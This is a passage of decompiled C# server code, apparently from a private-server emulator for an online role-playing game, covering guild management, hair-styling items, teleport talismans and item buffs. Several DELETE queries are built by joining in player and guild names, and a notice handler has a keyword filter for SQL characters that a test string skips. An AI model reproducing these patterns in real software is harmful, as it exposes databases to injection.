					string 帮派名字 = base.帮派名字;
					if (base.帮派人物等级 == 6)
					{
						DBA.ExeSqlCommand("DELETE FROM TBL_XWWL_Guild WHERE G_Master = '" + base.UserName + "'");
						foreach (Players value in World.AllConnectedPlayers.Values)
						{
							if (value.帮派名字 == 帮派名字)
							{
								RxjhClass.退出门派(value.UserName);
								value.读帮派数据();
								Buffer.BlockCopy(BitConverter.GetBytes(4), 0, array6, 27, 1);
								发送帮派消息(帮派名字, array6, array6.Length);
								value.初始化已装备物品();
								value.移动离开当前地图(value.人物坐标_地图);
								value.获取复查范围玩家();
							}
						}
						DBA.ExeSqlCommand("DELETE FROM TBL_XWWL_GuildMember WHERE G_Name = '" + 帮派名字 + "'");
					}
					else
					{
						RxjhClass.退出门派(base.UserName);
						读帮派数据();
						Buffer.BlockCopy(BitConverter.GetBytes(4), 0, array6, 27, 1);
						发送帮派消息(帮派名字, array6, array6.Length);
						初始化已装备物品();
						移动离开当前地图(base.人物坐标_地图);
						获取复查范围玩家();
					}
					break;
				}
				case 4:
				{
					byte[] array4 = new byte[14];
					Buffer.BlockCopy(封包数据, 29, array4, 0, 14);
					string text = Encoding.Default.GetString(array4).Replace("\0", string.Empty).Trim();
					DataTable dataTable = RxjhClass.得到帮派数据(base.帮派名字);
					if (dataTable == null)
					{
						break;
					}
					if (base.人物坐标_地图 == 42001)
					{
						系统提示("当前地图不能退出门派");
					}
					else if (dataTable.Rows.Count > 0)
					{
						string b = dataTable.Rows[0]["G_Master"].ToString();
						if (text == b)
						{
							break;
						}
						if (RxjhClass.逐出门派(text, base.帮派名字) == 0)
						{
							byte[] array5 = Converter.hexStringToByte("AA5530000A00E800220000000000000000000000000000000000000421617300000000000000000000000000000000000000000055AA");
							byte[] bytes = Encoding.Default.GetBytes(text);
							Buffer.BlockCopy(bytes, 0, array5, 29, bytes.Length);
							发送帮派消息(base.帮派名字, array5, array5.Length);
							Players players = 得到人物数据(text);
							if (players != null)
							{
								players.读帮派数据();
								players.初始化已装备物品();
								players.移动离开当前地图(base.人物坐标_地图);
								players.获取复查范围玩家();
							}
						}
					}
					dataTable.Dispose();
					break;
				}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "加入门派出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 创建门派确认(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				byte[] array = Converter.hexStringToByte("AA5520000000E4001200310000000000000000000000000000000300000000000000000055AA");
				byte[] array2 = new byte[15];
				Buffer.BlockCopy(封包数据, 10, array2, 0, 15);
				string text = Encoding.Default.GetString(array2).Replace("\0", string.Empty).Trim();
				byte[] bytes = Encoding.Default.GetBytes(text);
				Buffer.BlockCopy(bytes, 0, array, 10, bytes.Length);
				if (base.Player_Level < 35)
				{
					系统提示("你的等级不够35级，不能创建门派。");
					return;
				}
				if (base.Player_Money < 1000000)
				{
					系统提示("你的游戏币不够100万，不能创建门派。");
					return;
				}
				if (RxjhClass.创建帮派确认(text) == 1)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 26, 1);
				}
				else
				{
					Buffer.BlockCopy(BitConverter.GetBytes(99), 0, array, 26, 1);
				}
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "创建门派确认出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 创建门派(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				byte[] array = Converter.hexStringToByte("AA5520000000E6001200310000000000000000000000000000000100000000000000000055AA");
				byte[] array2 = new byte[15];
				Buffer.BlockCopy(封包数据, 10, array2, 0, 15);
				string text = Encoding.Default.GetString(array2).Replace("\0", string.Empty).Trim();
				if (base.Player_Level < 35)
				{
					系统提示("你的等级不够35级，不能创建门派。");
					return;
				}
				if (base.Player_Money < 1000000)
				{
					系统提示("你的游戏币不够100万不能创建门派。");
					return;
				}
				byte[] bytes = Encoding.Default.GetBytes(text);
				Buffer.BlockCopy(bytes, 0, array, 10, bytes.Length);
				switch (RxjhClass.创建帮派(base.UserName, text, base.Player_Level))
				{
				case 0:
					base.Player_Money -= 1000000L;
					更新金钱和负重();
					读帮派数据();
					初始化已装备物品();
					Buffer.BlockCopy(BitConverter.GetBytes(99), 0, array, 26, 1);
					break;
				case 1:
					Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 26, 1);
					break;
				case 2:
					系统提示("数据出错，请重新输入。");
					Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 27, 1);
					break;
				}
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				查帮派();
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "创建门派出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 修改帮派公告(byte[] 封包数据, int 封包大小)
		{
			封包修改(封包数据, 封包大小);
			byte[] array = new byte[50];
			Buffer.BlockCopy(封包数据, 14, array, 0, 50);
			string text = Encoding.Default.GetString(array).Replace("\0", string.Empty).Trim();
			if (text.IndexOf("测试", 0) != -1)
			{
				text = text.Remove(0, 2);
			}
			else if (text.IndexOf("'") != -1 || text.IndexOf(";") != -1 || text.IndexOf("--") != -1)
			{
				return;
			}
			if (base.帮派人物等级 == 6)
			{
				DBA.ExeSqlCommand(string.Format("UPDATE TBL_XWWL_Guild SET G_Notice =@sTemp WHERE G_Name =@Userid", base.帮派名字, text), new SqlParameter[2]
				{
					SqlDBA.MakeInParam("@Userid", SqlDbType.VarChar, 30, base.帮派名字),
					SqlDBA.MakeInParam("@sTemp", SqlDbType.VarChar, 30, text)
				});
				查帮派();
			}
			else
			{
				系统提示("你不是帮主，不可以修改帮派公告。");
			}
		}

		public void 查帮派()
		{
			if (base.帮派Id == 0)
			{
				return;
			}
			try
			{
				string hex = "000000000000A44E55AA";
				byte[] array = Converter.hexStringToByte2("AA55C200C802E900B400565E2600000000000000000000000000000000000200000001000000030000006500000000000000000000000000000000000000000000000000000000000000000000000000000000000000");
				byte[] array2 = Converter.hexStringToByte(hex);
				DataTable dataTable = RxjhClass.得到帮派数据(base.帮派名字);
				if (dataTable == null)
				{
					return;
				}
				byte[] bytes = BitConverter.GetBytes(base.帮派Id);
				Buffer.BlockCopy(bytes, 0, array, 10, bytes.Length);
				byte[] bytes2 = Encoding.Default.GetBytes(base.帮派名字);
				Buffer.BlockCopy(bytes2, 0, array, 14, bytes2.Length);
				int value = int.Parse(dataTable.Rows[0]["Leve"].ToString());
				int value2 = int.Parse(dataTable.Rows[0]["名声"].ToString());
				int value3 = 0;
				int value4 = 0;
				int value5 = 0;
				long value6 = 0L;
				try
				{
					value3 = int.Parse(dataTable.Rows[0]["门派武勋"].ToString());
					value4 = int.Parse(dataTable.Rows[0]["胜"].ToString());
					value5 = int.Parse(dataTable.Rows[0]["败"].ToString());
					int.Parse(dataTable.Rows[0]["平"].ToString());
					value6 = long.Parse(dataTable.Rows[0]["门派财产"].ToString());
					base.门派联盟盟主 = dataTable.Rows[0]["联盟盟主"].ToString();
					base.宣告攻城 = int.Parse(dataTable.Rows[0]["宣告攻城"].ToString());
				}
				catch (Exception ex)
				{
					MainForm.WriteLine(1, "查帮派新出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
				}
				byte[] array3 = new byte[100];
				byte[] bytes3 = Encoding.Default.GetBytes(dataTable.Rows[0]["G_Notice"].ToString());
				Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array, 30, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(value2), 0, array, 34, 2);
				if (base.帮派门徽 != null)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(World.服务器组ID), 0, array, 42, 2);
				}
				else
				{
					Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 42, 2);
				}
				Buffer.BlockCopy(BitConverter.GetBytes(value3), 0, array, 62, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(value4), 0, array, 66, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(value5), 0, array, 70, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(value6), 0, array, 74, 8);
				DataTable dataTable2 = RxjhClass.得到帮派人数(base.帮派名字);
				int num = dataTable2.Rows.Count;
				if (num > 100)
				{
					num = 100;
				}
				Buffer.BlockCopy(BitConverter.GetBytes(num), 0, array, 38, 2);
				byte[] array4 = new byte[num * 46 + array.Length + array2.Length + array3.Length];
				Buffer.BlockCopy(array, 0, array4, 0, array.Length);
				Buffer.BlockCopy(array2, 0, array4, array4.Length - array2.Length, array2.Length);
				for (int i = 0; i < num; i++)
				{
					byte[] bytes4 = Encoding.Default.GetBytes(dataTable2.Rows[i]["FLD_NAME"].ToString());
					string @string = Encoding.Default.GetString(bytes4);
					int num2 = int.Parse(dataTable2.Rows[i]["Leve"].ToString());
					if (base.UserName == @string)
					{
						base.帮派人物等级 = num2;
					}
					Buffer.BlockCopy(bytes4, 0, array4, array.Length + i * 46, bytes4.Length);
					Buffer.BlockCopy(BitConverter.GetBytes(num2), 0, array4, array.Length + 18 + i * 46, 2);
					try
					{
						if (得到人物数据(@string) != null)
						{
							Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array4, array.Length + 20 + i * 46, 2);
						}
					}
					catch (Exception ex2)
					{
						MainForm.WriteLine(1, "查帮派 成员 错误![" + base.Userid + "]-[" + base.UserName + "]" + ex2.Message);
					}
					Buffer.BlockCopy(BitConverter.GetBytes(int.Parse(dataTable2.Rows[i]["FLD_LEVEL"].ToString())), 0, array4, array.Length + 16 + i * 46, 2);
				}
				Buffer.BlockCopy(bytes3, 0, array4, array.Length + num * 46, bytes3.Length);
				Buffer.BlockCopy(BitConverter.GetBytes(58 + num * 46 + array3.Length + 8), 0, array4, 2, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(52 + num * 46 + array3.Length), 0, array4, 8, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send多包2(array4, array4.Length);
				}
				dataTable2.Dispose();
				dataTable.Dispose();
			}
			catch (Exception ex3)
			{
				MainForm.WriteLine(1, "查帮派出错![" + base.Userid + "]-[" + base.UserName + "]" + ex3.Message);
			}
		}

		public void 染发(byte[] 封包数据, int 封包大小)
		{
			try
			{
				if (base.人物坐标_地图 == 41001)
				{
					return;
				}
				封包修改(封包数据, 封包大小);
				byte[] array = new byte[4];
				byte[] array2 = new byte[2];
				Buffer.BlockCopy(封包数据, 10, array, 0, 1);
				Buffer.BlockCopy(封包数据, 12, array2, 0, 2);
				if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array, 0)].物品ID, 0) == 1008000015)
				{
					byte[] array3 = Converter.hexStringToByte("AA5527000A00111018000100030041440300000000000FDC143C000000000000D5EF00000000000000000055AA");
					byte[] array4 = Converter.hexStringToByte("AA5512000000121004000000D5EF000000000000000055AA");
					Buffer.BlockCopy(array, 0, array3, 12, 1);
					Buffer.BlockCopy(array2, 0, array3, 32, 2);
					Buffer.BlockCopy(array2, 0, array4, 12, 2);
					Buffer.BlockCopy(装备栏包裹[BitConverter.ToInt32(array, 0)].物品全局ID, 0, array3, 14, 8);
					Buffer.BlockCopy(装备栏包裹[BitConverter.ToInt32(array, 0)].物品ID, 0, array3, 22, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array3, array3.Length);
					}
					if (base.Client != null)
					{
						base.Client.Send(array4, array4.Length);
					}
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 10, 2);
					发送当前范围广播数据(array4, array4.Length);
					New人物模版.发色 = BitConverter.ToInt16(array2, 0);
					减去物品(BitConverter.ToInt32(array, 0), 1);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "染发出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 美发(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				byte[] array = new byte[4];
				byte[] array2 = new byte[4];
				Buffer.BlockCopy(封包数据, 10, array, 0, 1);
				Buffer.BlockCopy(封包数据, 14, array2, 0, 2);
				if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array, 0)].物品ID, 0) == 1008000101)
				{
					byte[] array3 = Converter.hexStringToByte("AA5527002C01081618000100080041440300000000000FDC143C0000000000009B0000000000000000000055AA");
					byte[] array4 = Converter.hexStringToByte("AA5512002A01091604002A019999000000000000000055AA");
					Buffer.BlockCopy(array, 0, array3, 12, 1);
					Buffer.BlockCopy(array2, 0, array3, 32, 1);
					Buffer.BlockCopy(装备栏包裹[BitConverter.ToInt32(array, 0)].物品全局ID, 0, array3, 14, 8);
					Buffer.BlockCopy(装备栏包裹[BitConverter.ToInt32(array, 0)].物品ID, 0, array3, 22, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
					Buffer.BlockCopy(array2, 0, array3, 29, 1);
					Buffer.BlockCopy(array2, 0, array4, 12, 1);
					Buffer.BlockCopy(array2, 0, array4, 13, 1);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array3, array3.Length);
					}
					if (base.Client != null)
					{
						base.Client.Send(array4, array4.Length);
					}
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 10, 2);
					发送当前范围广播数据(array4, array4.Length);
					New人物模版.发型 = array2[0];
					减去物品(BitConverter.ToInt32(array, 0), 1);
					初始化已装备物品();
					更新武功和状态();
					更新广播人物数据();
					更新人物数据(this);
					更新装备效果();
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "染发出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 删除土灵符(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				byte[] array = new byte[4];
				byte[] array2 = new byte[15];
				Buffer.BlockCopy(封包数据, 10, array2, 0, 15);
				Buffer.BlockCopy(封包数据, 25, array, 0, 2);
				土灵符坐标.Remove(BitConverter.ToInt32(array, 0));
				byte[] array3 = Converter.hexStringToByte("AA55310000000F10230001000A003132333400000000000000000000006500000054A8034400007041342FCB44000000000000000055AA");
				Buffer.BlockCopy(array, 0, array3, 12, 2);
				Buffer.BlockCopy(array2, 0, array3, 14, array2.Length);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array3, array3.Length);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "删除土灵符出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 保存土灵符(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				if (World.当前是否是银币线路 == 1)
				{
					系统提示("银币广场不允许使用土灵符。", 50, "系统提示");
					return;
				}
				string[] array = World.地图锁定.Split(';');
				if (array.Length >= 1)
				{
					for (int i = 0; i < array.Length; i++)
					{
						if (int.Parse(array[i]) == base.人物坐标_地图)
						{
							return;
						}
					}
				}
				byte[] array2 = new byte[4];
				byte[] array3 = new byte[15];
				for (int j = 0; j < 15 && 封包数据[10 + j] != 0; j++)
				{
					array3[j] = 封包数据[10 + j];
				}
				string rxjh_name = Encoding.Default.GetString(array3).Replace("\0", string.Empty);
				Buffer.BlockCopy(封包数据, 25, array2, 0, 2);
				坐标Class 坐标Class2 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图)
				{
					Rxjh_name = rxjh_name
				};
				if (土灵符坐标.ContainsKey(BitConverter.ToInt32(array2, 0)))
				{
					土灵符坐标.Remove(BitConverter.ToInt32(array2, 0));
				}
				土灵符坐标.Add(BitConverter.ToInt32(array2, 0), 坐标Class2);
				发送保存土灵符数据(array3, array2, 坐标Class2);
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "保存土灵符出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 发送保存土灵符数据(byte[] name, byte[] 保存ID, 坐标Class 坐标)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA55310000000D10230001000A003132333400000000000000000000006500000054A8034400007041342FCB44000000000000000055AA");
				Buffer.BlockCopy(保存ID, 0, array, 12, 2);
				Buffer.BlockCopy(name, 0, array, 14, name.Length);
				Buffer.BlockCopy(BitConverter.GetBytes(坐标.Rxjh_Map), 0, array, 29, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(坐标.Rxjh_X), 0, array, 33, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(坐标.Rxjh_Z), 0, array, 37, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(坐标.Rxjh_Y), 0, array, 41, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "发送保存土灵符数据出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 发送土灵符数据()
		{
			try
			{
				string hex = "000000000000000055AA";
				byte[] array = Converter.hexStringToByte("AA5594002C010B1086000600");
				byte[] array2 = Converter.hexStringToByte(hex);
				byte[] array3 = new byte[土灵符坐标.Count * 33 + array.Length + array2.Length];
				Buffer.BlockCopy(array, 0, array3, 0, array.Length);
				Buffer.BlockCopy(array2, 0, array3, array3.Length - array2.Length, array2.Length);
				Buffer.BlockCopy(BitConverter.GetBytes(2 + 土灵符坐标.Count * 33), 0, array3, 8, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(16 + 土灵符坐标.Count * 33), 0, array3, 2, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(土灵符坐标.Count), 0, array3, 10, 1);
				int num = 0;
				foreach (DictionaryEntry item in 土灵符坐标)
				{
					坐标Class 坐标Class2 = (坐标Class)item.Value;
					int value = (int)item.Key;
					byte[] bytes = Encoding.Default.GetBytes(坐标Class2.Rxjh_name);
					Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array3, 12 + num * 33, 2);
					Buffer.BlockCopy(bytes, 0, array3, 14 + num * 33, bytes.Length);
					Buffer.BlockCopy(BitConverter.GetBytes(坐标Class2.Rxjh_Map), 0, array3, 29 + num * 33, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(坐标Class2.Rxjh_X), 0, array3, 33 + num * 33, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(坐标Class2.Rxjh_Z), 0, array3, 37 + num * 33, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(坐标Class2.Rxjh_Y), 0, array3, 41 + num * 33, 4);
					num++;
				}
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array3, array3.Length);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "发送土灵符数据出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 使用土灵符(byte[] 封包数据, int length)
		{
			try
			{
				if (base.Player死亡 || 打开仓库中)
				{
					return;
				}
				if (DateTime.Now.Subtract(使用大土time).TotalSeconds < 10.0)
				{
					系统提示("土灵符每10秒可使用一回", 9, "系统提示");
					return;
				}
				if (World.当前是否是银币线路 == 1)
				{
					系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
					return;
				}
				使用大土time = DateTime.Now;
				封包修改(封包数据, length);
				byte[] array = new byte[4];
				byte[] array2 = new byte[4];
				Buffer.BlockCopy(封包数据, 10, array, 0, 2);
				Buffer.BlockCopy(封包数据, 12, array2, 0, 2);
				byte[] dst = Converter.hexStringToByte("AA552200020308101C0001000000000000000000000000000000000000000000000000000A0055AA");
				byte[] array3 = Converter.hexStringToByte("AA552B002C0108101C0001000A003E44030000000000C399053C00000000010018943577010000000000000000000055AA");
				坐标Class 坐标Class2 = (坐标Class)土灵符坐标[BitConverter.ToInt32(array2, 0)];
				if (坐标Class2 == null)
				{
					goto IL_0270;
				}
				if (坐标Class2.Rxjh_Map == 9001 || 坐标Class2.Rxjh_Map == 9101 || 坐标Class2.Rxjh_Map == 9201 || 坐标Class2.Rxjh_Map == 42001 || 坐标Class2.Rxjh_Map == 42101)
				{
					系统提示("此处不允许使用。");
					return;
				}
				if (坐标Class2.Rxjh_Map == 32002)
				{
					if (活动地图剩余时间 <= 0)
					{
						系统提示("移动失败, 活动地图剩余时间为零。");
						return;
					}
					FBtime = DateTime.Now;
					系统提示("开始计时, [" + 活动地图剩余时间 + "]分钟后自动传送到泫勃派。");
					goto IL_0270;
				}
				if (坐标Class2.Rxjh_Map != 30000 && 坐标Class2.Rxjh_Map != 30100 && 坐标Class2.Rxjh_Map != 30200 && 坐标Class2.Rxjh_Map != 30300)
				{
					goto IL_0270;
				}
				if (修炼地图剩余时间 <= 0)
				{
					系统提示("移动失败, 修炼地图剩余时间为零。");
					return;
				}
				FBtime = DateTime.Now;
				系统提示("开始计时, [" + 修炼地图剩余时间 + "]分钟后自动传送到泫勃派。");
				goto IL_0270;
				IL_0270:
				byte[] array4 = new byte[4];
				byte[] array5 = new byte[8];
				byte[] dst2 = new byte[4];
				int num = BitConverter.ToInt32(array, 0);
				int value = BitConverter.ToInt32(array2, 0);
				if (num != 0)
				{
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1007000020 || BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1007000002 || BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1007000003)
					{
						Buffer.BlockCopy(装备栏包裹[num].物品_byte, 16, array4, 0, 4);
						Buffer.BlockCopy(装备栏包裹[num].物品_byte, 8, dst2, 0, 4);
						Buffer.BlockCopy(装备栏包裹[num].物品_byte, 0, array5, 0, 8);
						int num2 = BitConverter.ToInt32(array4, 0) - 2000000000 - 1;
						if (num2 <= 0)
						{
							Buffer.BlockCopy(BitConverter.GetBytes(2000000000), 0, array3, 32, 4);
						}
						else
						{
							Buffer.BlockCopy(BitConverter.GetBytes(num2 + 2000000000), 0, array3, 32, 4);
							Buffer.BlockCopy(BitConverter.GetBytes(num2 + 2000000000), 0, 装备栏包裹[num].物品_byte, 16, 4);
						}
						Buffer.BlockCopy(array5, 0, array3, 14, 8);
						Buffer.BlockCopy(array, 0, array3, 12, 2);
						Buffer.BlockCopy(装备栏包裹[num].物品ID, 0, array3, 22, 4);
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send(array3, array3.Length);
						}
						if (num2 < 0)
						{
							减去物品(num, 1);
						}
					}
				}
				else
				{
					Buffer.BlockCopy(BitConverter.GetBytes(value), 0, dst, 36, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, dst, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array3, array3.Length);
					}
				}
				if (坐标Class2 != null)
				{
					移动(坐标Class2.Rxjh_X, 坐标Class2.Rxjh_Y, 坐标Class2.Rxjh_Z, 坐标Class2.Rxjh_Map);
				}
				获取复查范围玩家();
				获取复查范围Npc();
				获取复查范围地面物品();
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "使用土灵符出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void set公有物品()
		{
			foreach (公有药品类 value in 公有药品.Values)
			{
				set公有物品(value);
			}
		}

		public void set公有物品(公有药品类 yp)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA5518002C01F9000A00037C17765E00FFFFFFFF000000000000000055AA");
				DateTime t = new DateTime(1970, 1, 1, 8, 0, 0).AddSeconds(yp.时间);
				if (t > DateTime.Now)
				{
					switch (yp.药品ID)
					{
					case 1008000058:
						Buffer.BlockCopy(BitConverter.GetBytes(11), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.2;
						base.FLD_人物_追加_历练百分比 += 0.5;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_合成成功率百分比 += 0.05;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						break;
					case 1008000059:
						Buffer.BlockCopy(BitConverter.GetBytes(12), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.2;
						base.FLD_人物_追加_历练百分比 += 0.5;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						break;
					case 1008000060:
						Buffer.BlockCopy(BitConverter.GetBytes(13), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.2;
						base.FLD_人物_追加_历练百分比 += 0.5;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						break;
					case 1008000061:
						Buffer.BlockCopy(BitConverter.GetBytes(28), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.2;
						base.FLD_人物_追加_历练百分比 += 0.5;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_合成成功率百分比 += 0.05;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						break;
					case 1008000062:
						Buffer.BlockCopy(BitConverter.GetBytes(29), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.2;
						base.FLD_人物_追加_历练百分比 += 0.5;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						break;
					case 1008000063:
						Buffer.BlockCopy(BitConverter.GetBytes(30), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.2;
						base.FLD_人物_追加_历练百分比 += 0.5;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						break;
					case 1008000027:
						Buffer.BlockCopy(BitConverter.GetBytes(3), 0, array, 10, 1);
						break;
					case 1008000028:
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.2;
						base.FLD_人物_追加_历练百分比 += 0.5;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						break;
					case 1008000029:
						Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.2;
						base.FLD_人物_追加_历练百分比 += 0.5;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						break;
					case 1008000141:
						Buffer.BlockCopy(BitConverter.GetBytes(37), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.3;
						base.FLD_人物_追加_历练百分比 += 0.3;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_合成成功率百分比 += 0.05;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						base.FLD_人物_追加_吸魂几率百分比 += 15.0;
						base.FLD_人物_追加_武勋获得量百分比 += 0.5;
						break;
					case 1008000140:
						Buffer.BlockCopy(BitConverter.GetBytes(36), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.25;
						base.FLD_人物_追加_历练百分比 += 0.5;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_合成成功率百分比 += 0.05;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						break;
					case 1008000124:
						Buffer.BlockCopy(BitConverter.GetBytes(35), 0, array, 10, 1);
						break;
					case 1008000312:
						Buffer.BlockCopy(BitConverter.GetBytes(70), 0, array, 10, 1);
						break;
					case 1008000311:
						Buffer.BlockCopy(BitConverter.GetBytes(69), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.2;
						base.FLD_人物_追加_历练百分比 += 0.2;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_合成成功率百分比 += 0.05;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						base.FLD_人物_追加_武勋获得量百分比 += 0.5;
						base.FLD_人物_追加_吸魂几率百分比 += 15.0;
						break;
					default:
						Buffer.BlockCopy(BitConverter.GetBytes(4), 0, array, 10, 1);
						break;
					case 1008000877:
						Buffer.BlockCopy(BitConverter.GetBytes(69), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.2;
						base.FLD_人物_追加_历练百分比 += 0.2;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_合成成功率百分比 += 0.05;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						base.FLD_人物_追加_武勋获得量百分比 += 0.5;
						base.FLD_人物_追加_吸魂几率百分比 += 15.0;
						break;
					case 1008000320:
						Buffer.BlockCopy(BitConverter.GetBytes(37), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.3;
						base.FLD_人物_追加_历练百分比 += 0.3;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_合成成功率百分比 += 0.05;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						base.FLD_人物_追加_吸魂几率百分比 += 15.0;
						base.FLD_人物_追加_武勋获得量百分比 += 0.5;
						base.FLD_人物_追加_物品掉落概率百分比 += 0.2;
						break;
					case 1008000318:
